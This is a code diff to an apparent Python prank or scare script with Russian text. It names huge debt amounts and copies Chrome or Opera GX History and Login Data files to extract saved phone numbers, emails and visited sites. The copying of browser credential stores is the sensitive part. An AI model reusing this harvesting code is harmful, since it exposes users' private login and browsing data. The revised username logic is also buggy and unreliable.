@@ -107,11 +107,11 @@ def whatIsNumber(dolg):
                '99': 'октононагинтиллион',
                '100': 'новемнонагинтиллион',
                '101': 'центиллион'}
-    a = dict(Counter("{:,}".format(dolg)))
-    if ',' in a:
-        digitPlace = a[',']
+    symbolAmount = dict(Counter("{:,}".format(dolg)))
+    if ',' in symbolAmount:
+        digitPlace = symbolAmount[',']
     else:
-        digitPlace = 1
+        digitPlace = 0
     if 2 <= int(dolg / int(1000 ** digitPlace)) % 10 <= 4:
         if 10 <= int(dolg / int(1000 ** digitPlace)) % 100 <= 20:
             ending = 'ов'
@@ -130,6 +130,8 @@ def whatIsNumber(dolg):
             ending_1k = 'и'
     elif 5 <= int(dolg / int(1000 ** digitPlace)) % 10 <= 9 or int(dolg / int(1000 ** digitPlace)) % 10 == 0:
         ending_1k = ''
+    if digitPlace == 0:
+        b = "< 1 тысячи"
     if digitPlace == 1:
         b = str(int(dolg / int(1000 ** digitPlace))) + ' тысяч' + ending_1k
     for digitPlace in range(2, 101):
@@ -159,18 +161,24 @@ def getHistoryDB():
         target = str(os.path.abspath(os.curdir)) + r'\History.db'
         shutil.copy2(original, target)
     except:
-        original = os.getenv('appdata') + r'\Opera Software\Opera GX Stable\History'
-        target = str(os.path.abspath(os.curdir)) + r'\History.db'
-        shutil.copy2(original, target)
+        try:
+            original = os.getenv('appdata') + r'\Opera Software\Opera GX Stable\History'
+            target = str(os.path.abspath(os.curdir)) + r'\History.db'
+            shutil.copy2(original, target)
+        except:
+            print("Браузер не поддерживается")
 def getLoginDataDB():
     try:
         original = os.getenv('localappdata') + r'\Google\Chrome\User Data\Default\Login Data'
         target = str(os.path.abspath(os.curdir)) + r'\Login Data.db'
         shutil.copy2(original, target)
     except:
-        original = os.getenv('appdata') + r'\Opera Software\Opera GX Stable\Login Data'
-        target = str(os.path.abspath(os.curdir)) + r'\Login Data.db'
-        shutil.copy2(original, target)
+        try:
+            original = os.getenv('appdata') + r'\Opera Software\Opera GX Stable\Login Data'
+            target = str(os.path.abspath(os.curdir)) + r'\Login Data.db'
+            shutil.copy2(original, target)
+        except:
+            print("Браузер не поддерживается")
 def dictFactory(cursor, row):
     d = {}
     for idx, col in enumerate(cursor.description):
@@ -198,24 +206,26 @@ def makeDictFromLoginDataDB():
         var1 = [None]
     return var1
 def getLoginsFromLoginDataDB(logins):
-    try:
-        phoneNumber = []
-        email = []
-        for sites in logins:
-            # print(sites)
-            if '+7' in sites['username_value']:
-                phoneNumber.append(sites['username_value'])
-            if '@' in sites['username_value']:
-                email.append(sites['username_value'])
-        return random.choice(phoneNumber), random.choice(email)
-    except:
-        phoneNumber, email = None, None
-        return phoneNumber, email
+    phoneNumber = []
+    email = []
+    for sites in logins:
+        # print(sites)
+        if '+7' in sites['username_value']:
+            phoneNumber.append(sites['username_value'])
+        else:
+            phoneNumber = [None]
+        if '@' in sites['username_value']:
+            email.append(sites['username_value'])
+        else:
+            email = [None]
+    return random.choice(phoneNumber), random.choice(email)
 def randomFactsFromHistory(var1):
     try:
         randomSite = random.choice(var1)
         randomFact = f"Last time you visited {randomSite['title']}, was {dateFromWebkit(randomSite['last_visit_time'])}"
+        randomUrl = randomSite['url']
     except:
         randomFact = None
-    return randomFact
+        randomUrl = None
+    return randomFact, randomUrl
 
